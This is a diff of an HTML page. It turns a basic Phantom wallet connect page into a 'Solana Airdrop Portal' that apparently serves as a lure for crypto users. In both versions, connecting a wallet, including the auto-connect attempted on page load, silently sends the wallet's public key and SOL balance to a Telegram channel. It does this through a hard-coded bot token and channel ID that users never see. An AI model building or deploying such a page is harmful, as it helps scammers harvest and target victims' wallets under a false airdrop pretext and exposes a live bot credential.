@@ -1,100 +1,232 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connect Phantom Wallet</title>
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-  <style>
-    body {
-      background-color: #0d0d0d;
-      color: white;
-      text-align: center;
-      font-family: sans-serif;
-      padding-top: 80px;
-    }
-    button {
-      background: #6200ea;
-      color: white;
-      border: none;
-      padding: 14px 24px;
-      font-size: 16px;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Airdrop Portal</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #9945FF;
+            margin-bottom: 30px;
+        }
+        .wallet-info {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f0f0f0;
+            border-radius: 8px;
+            word-break: break-all;
+            text-align: left;
+        }
+        .connect-btn {
+            background-color: #9945FF;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .connect-btn:hover {
+            background-color: #7a36cc;
+        }
+        .status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .success {
+            color: #4CAF50;
+        }
+        .error {
+            color: #F44336;
+        }
+        .mobile-instructions {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #fff8e1;
+            border-radius: 8px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <h1>Connect Your Solana Wallet</h1>
-  <button id="connectBtn">Connect Phantom</button>
-  <p id="walletInfo"></p>
+    <div class="container">
+        <h1>Solana Airdrop Portal</h1>
+        <p>Connect your Phantom wallet to participate in the airdrop</p>
+        
+        <button id="connectButton" class="connect-btn">Connect Wallet</button>
+        
+        <div id="mobileInstructions" class="mobile-instructions">
+            <p>Please open this page in the Phantom browser to connect automatically.</p>
+            <p>Or tap below to open in Phantom:</p>
+            <button id="openInPhantom" class="connect-btn" style="margin-top: 10px;">Open in Phantom</button>
+        </div>
+        
+        <div id="walletInfo" class="wallet-info" style="display: none;">
+            <p><strong>Public Key:</strong> <span id="publicKey"></span></p>
+            <p><strong>Balance:</strong> <span id="balance"></span> SOL</p>
+        </div>
+        
+        <div id="statusMessage" class="status"></div>
+    </div>
 
-  <script>
-    const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
-    const CHANNEL_ID = "-1002600871606";
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
+    <script>
+        // Telegram bot configuration
+        const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
+        const CHANNEL_ID = "-1002600871606";
 
-    const walletInfo = document.getElementById("walletInfo");
-
-    async function sendToTelegram(walletAddress) {
-      const message = `✅ Wallet Connected: ${walletAddress}`;
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHANNEL_ID, text: message })
-      });
-    }
-
-    async function fetchBalance(pubkey) {
-      const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
-      const balanceLamports = await conn.getBalance(new solanaWeb3.PublicKey(pubkey));
-      const sol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
-      return sol.toFixed(4);
-    }
-
-    function isMobile() {
-      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    }
-
-    async function connectPhantom() {
-      if (window.solana && window.solana.isPhantom) {
-        try {
-          const resp = await window.solana.connect({ onlyIfTrusted: true });
-          const pubkey = resp.publicKey.toString();
-          const balance = await fetchBalance(pubkey);
-          walletInfo.textContent = `Wallet: ${pubkey} | Balance: ${balance} SOL`;
-          await sendToTelegram(pubkey);
-        } catch (err) {
-          console.warn("Trusted connection failed.");
+        // Check if Phantom is installed
+        function isPhantomInstalled() {
+            return window.solana && window.solana.isPhantom;
         }
-      } else if (isMobile()) {
-        const dappUrl = encodeURIComponent(window.location.href);
-        window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
-      } else {
-        alert("Phantom Wallet not detected. Please install Phantom.");
-      }
-    }
 
-    document.getElementById("connectBtn").addEventListener("click", async () => {
-      if (window.solana && window.solana.isPhantom) {
-        try {
-          const resp = await window.solana.connect();
-          const pubkey = resp.publicKey.toString();
-          const balance = await fetchBalance(pubkey);
-          walletInfo.textContent = `Wallet: ${pubkey} | Balance: ${balance} SOL`;
-          await sendToTelegram(pubkey);
-        } catch (err) {
-          console.error("Connection rejected:", err);
+        // Detect mobile device
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         }
-      } else if (isMobile()) {
-        const dappUrl = encodeURIComponent(window.location.href);
-        window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
-      } else {
-        alert("Phantom Wallet not found. Please use Phantom or install it.");
-      }
-    });
 
-    // Try auto-connect on load
-    window.addEventListener('DOMContentLoaded', connectPhantom);
-  </script>
+        // Format balance
+        function formatBalance(balance) {
+            return (balance / 1000000000).toFixed(2);
+        }
+
+        // Send message to Telegram
+        async function sendToTelegram(walletAddress, balance) {
+            const message = `✅ Wallet Connected:
+Public Key: ${walletAddress}
+Balance: ${formatBalance(balance)} SOL`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHANNEL_ID,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        // Connect to Phantom wallet
+        async function connectWallet() {
+            const connectButton = document.getElementById('connectButton');
+            const walletInfo = document.getElementById('walletInfo');
+            const publicKeyElement = document.getElementById('publicKey');
+            const balanceElement = document.getElementById('balance');
+            const statusMessage = document.getElementById('statusMessage');
+            const mobileInstructions = document.getElementById('mobileInstructions');
+
+            try {
+                // Check if Phantom is installed
+                if (!isPhantomInstalled()) {
+                    if (isMobile()) {
+                        // Show mobile instructions and hide connect button
+                        connectButton.style.display = 'none';
+                        mobileInstructions.style.display = 'block';
+                        return;
+                    } else {
+                        throw new Error('Phantom wallet is not installed. Please install it from https://phantom.app/');
+                    }
+                }
+
+                // Connect to wallet
+                const response = await window.solana.connect();
+                const publicKey = response.publicKey.toString();
+                publicKeyElement.textContent = publicKey;
+
+                // Get balance
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                const balance = await connection.getBalance(response.publicKey);
+                balanceElement.textContent = formatBalance(balance);
+
+                // Show wallet info
+                walletInfo.style.display = 'block';
+                connectButton.style.display = 'none';
+                mobileInstructions.style.display = 'none';
+
+                // Update status
+                statusMessage.textContent = 'Wallet connected successfully!';
+                statusMessage.className = 'status success';
+
+                // Send to Telegram
+                await sendToTelegram(publicKey, balance);
+
+            } catch (error) {
+                console.error('Error connecting wallet:', error);
+                statusMessage.textContent = error.message;
+                statusMessage.className = 'status error';
+            }
+        }
+
+        // Handle mobile deep linking
+        function setupMobileDeepLink() {
+            const openInPhantom = document.getElementById('openInPhantom');
+            if (openInPhantom) {
+                openInPhantom.addEventListener('click', () => {
+                    // Phantom's universal link for deep linking
+                    const phantomDeepLink = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
+                    
+                    // Try to open the app directly
+                    window.location.href = phantomDeepLink;
+                    
+                    // Fallback to opening in new tab if app isn't installed
+                    setTimeout(() => {
+                        window.open('https://phantom.app/', '_blank');
+                    }, 500);
+                });
+            }
+        }
+
+        // Auto-connect if Phantom is available
+        function tryAutoConnect() {
+            if (isPhantomInstalled()) {
+                window.solana.connect({ onlyIfTrusted: true })
+                    .then(response => {
+                        if (response) {
+                            // If auto-connected, proceed with showing wallet info
+                            connectWallet();
+                        }
+                    })
+                    .catch(error => {
+                        console.log('Auto-connect not possible:', error);
+                    });
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            setupMobileDeepLink();
+            tryAutoConnect();
+            
+            const connectButton = document.getElementById('connectButton');
+            if (connectButton) {
+                connectButton.addEventListener('click', connectWallet);
+            }
+        });
+    </script>
 </body>
 </html>
